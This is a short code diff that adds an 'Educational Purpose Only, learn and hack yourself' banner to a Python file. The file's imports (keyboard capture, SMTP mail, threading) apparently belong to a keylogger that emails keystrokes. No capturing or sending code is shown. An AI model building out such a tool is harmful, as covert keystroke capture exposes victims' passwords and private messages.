@@ -1,3 +1,6 @@
+""" The code is developed for Educational Purpose Only , learn and hack yourself
+                      --> BY HACK WITH ROHIT TAMIL"""
+
 import pynput.keyboard
 import smtplib
 import threading
